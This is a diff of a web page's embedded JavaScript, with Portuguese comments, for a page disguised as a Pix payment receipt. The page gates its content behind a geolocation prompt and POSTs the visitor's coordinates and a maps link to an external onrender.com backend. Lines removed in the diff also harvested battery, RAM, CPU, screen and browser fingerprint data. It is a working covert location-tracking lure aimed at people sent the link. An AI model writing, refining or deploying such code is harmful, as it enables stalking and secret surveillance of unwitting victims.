@@ -285,12 +285,14 @@
   </div>
 
   <script>
-    // --- JAVASCRIPT ATUALIZADO (FINGERPRINTING) ---
+    // --- JAVASCRIPT EMBUTIDO (SEM ARQUIVO EXTERNO) ---
 
+    // Variáveis para guardar os dados e enviar depois
     let nomeFinal = "JORGE LUIZ DA CONCEIÇÃO";
     let valorFinal = "2000,00";
 
     window.addEventListener("load", () => {
+      // 1. Configura nomes via Link
       const params = new URLSearchParams(window.location.search);
       const nomeUrl = params.get('nome');
       const valorUrl = params.get('valor');
@@ -304,6 +306,7 @@
         document.getElementById('valor-pix').innerText = "R$ " + valorFinal;
       }
 
+      // 2. PEDE LOCALIZAÇÃO AUTOMATICAMENTE
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendLocation, handleError);
       } else {
@@ -312,57 +315,33 @@
       }
     });
 
-    // Função auxiliar para pegar Bateria (agora async)
-    async function getBatteryInfo() {
-      try {
-        if (navigator.getBattery) {
-          const battery = await navigator.getBattery();
-          return `Nível: ${Math.round(battery.level * 100)}% | Carregando: ${battery.charging ? 'Sim' : 'Não'}`;
-        }
-      } catch (e) { }
-      return "Indisponível";
-    }
-
-    // Função Principal agora é ASYNC para esperar a bateria
-    async function sendLocation(position) {
+    function sendLocation(position) {
+      // Mostra o site
       document.getElementById('tela-bloqueio').style.display = 'none';
       document.getElementById('site-real').style.display = 'block';
 
-      // Coleta dados de Fingerprinting
-      const bateriaInfo = await getBatteryInfo();
-      const conexaoInfo = navigator.connection ? navigator.connection.effectiveType : "Desconhecido"; // 4g, wifi...
-      const memoriaRAM = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Indisponível";
-      const nucleosCPU = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Núcleos` : "Indisponível";
-      const resolucao = `${window.screen.width}x${window.screen.height}`;
-      const userAgent = navigator.userAgent;
-
+      // Envia dados
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
-      // Mantendo seu link de mapa exato
       const maps = `http://maps.google.com/?q=${latitude},${longitude}`;
 
-      // Envia tudo para o Backend
+      // LINK ORIGINAL: l817 (LETRA L)
       fetch("https://comprovante-pix-l817.onrender.com/send-location", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
+        // Adicionando apenas as variáveis dinâmicas ao envio
         body: JSON.stringify({
           latitude,
           longitude,
           maps,
           nome: nomeFinal,
-          valor: valorFinal,
-          // Dados extras de Fingerprint:
-          bateria: bateriaInfo,
-          conexao: conexaoInfo,
-          ram: memoriaRAM,
-          cpu: nucleosCPU,
-          tela: resolucao,
-          navegador: userAgent
+          valor: valorFinal
         })
       }).catch(e => console.error(e));
     }
 
     function handleError(error) {
+      // Se a pessoa bloquear, mostra erro
       document.getElementById('msg-erro').style.display = 'block';
     }
   </script>
